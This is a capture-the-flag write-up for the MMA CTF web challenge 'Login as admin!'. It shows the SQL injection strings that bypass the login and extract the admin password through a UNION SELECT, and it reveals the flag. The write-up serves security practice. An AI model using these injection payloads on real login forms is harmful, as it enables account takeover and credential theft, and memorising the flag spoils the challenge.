# Login as admin!

## Problem

Login as admin. And get the flag! The flag is the password of admin.

http://arrive.chal.mmactf.link/login.cgi

You can use test:test.

## Solution

Commendation: [@emedvedev](https://github.com/emedvedev)

The form contains an easy SQL injection and you can login as admin with entering `admin' --` in the username field.

```
Congratulations!!
You are admin user.
The flag is your password!
```

There's a username in the output, so we get a password with another injection angle: using a `UNION SELECT` instead of username.

Login with `' union select (SELECT password FROM user WHERE user='admin'),2--`. You'll see the flag:

```
You are MMA{cats_alice_band} user.
```
